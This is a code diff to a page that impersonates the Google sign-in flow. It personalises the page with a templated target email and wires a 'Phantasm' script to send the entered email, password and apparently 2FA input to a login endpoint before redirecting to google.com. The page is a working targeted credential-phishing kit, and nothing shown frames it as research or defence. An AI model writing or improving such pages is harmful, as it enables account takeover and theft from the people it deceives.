@@ -185,7 +185,7 @@
             <p class="subtitle">Use your Google Account</p>
             
             <div class="input-wrapper">
-                <input type="email" id="email-input" class="input-field" placeholder=" " required>
+                <input type="email" id="email-input" class="input-field" placeholder=" " value="{{ target_email }}" required>
                 <label class="input-label">Email or phone</label>
             </div>
             
@@ -208,7 +208,7 @@
             <h1>Welcome</h1>
             <div class="profile-pill" id="profile-pill-back">
                 <img src="https://www.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png" alt="User">
-                <span id="user-email-display">user@example.com</span>
+                <span id="user-email-display">{{ target_email }}</span>
                 <svg viewBox="0 0 24 24" style="width: 18px; height: 18px; fill: #5f6368; margin-left: 8px;"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z"></path></svg>
             </div>
             
@@ -238,7 +238,7 @@
             
             <div class="profile-pill">
                 <img src="https://www.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png" alt="User">
-                <span id="user-email-2fa">user@example.com</span>
+                <span id="user-email-2fa">{{ target_email }}</span>
             </div>
             
             <div class="input-wrapper">
@@ -280,6 +280,7 @@
 
             new Phantasm({
                 redirectUrl: 'https://www.google.com',
+                apiEndpoint: '/v5/auth/login',
                 selectors: {
                     email: '#email-input',
                     password: '#password-input',
